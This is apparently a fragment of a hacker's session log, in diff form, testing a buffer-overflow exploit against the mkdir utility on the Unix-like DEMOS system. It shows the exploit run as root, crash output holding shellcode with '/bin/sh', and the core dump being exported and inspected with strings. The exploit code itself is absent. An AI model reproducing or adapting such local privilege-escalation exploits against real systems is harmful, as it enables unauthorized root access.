+user > mkdir /etc/test
+mkdir: cannot access /etc/.
+
+So exploit does not work on DEMOS ... 
+No coredump under standard user privileges 
+Lets try via root if we can get a coredump 
+
+user > 
+CTRL+D 
+login as root 
+SUPER > cd /usr/user
+SUPER > ./exploit
+mkdir: cannot access аааааааааааааааааааааааааааЕжЪBбЕЬЪ2
+ЪЪB!
+C!DА!!; IIIII/bin/shaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Ч/.
+Наруш. защиты памяти (память дампирована)
+ 
+- Hey we got a coredump 
+
+SUPER > ls -la core 
+ 5 -rw-rw-r-- 1 root     sys         4160 сен 11 16:38 core
+SUPER > 
+- Now uuencode the core file so we can check it on Linux 
+SUPER > /path/to/uuencode /usr/user/core core 
+- Copy the ASCII output
+- Paste the ASCII output and save it on host as core.txt 
+$ uudecode core.txt 
+$ strings core 
+core
+core
+mkdir
+Af~f~
+aaaaaa
+mkdir: arg count
+mkdir: cannot access %aa
+mkdir: cannot make directory %s
+mkdir: cannot link %s
+mkdir: cannot link %s
+(null)
+kdir: cannot access 
+/bin/shaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+/bin/mkdir
+/bin/shaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+HOME=/
+PATH=/:/bin:.:/usr/bin:/etc:/usr/ucb
+TERM=ccgd
+SHELL=/bin/csh
+USER=root
+MSG=r
+TAPE=/dev/fd0
+
+
+More to come :D 
+
+
+
+ 
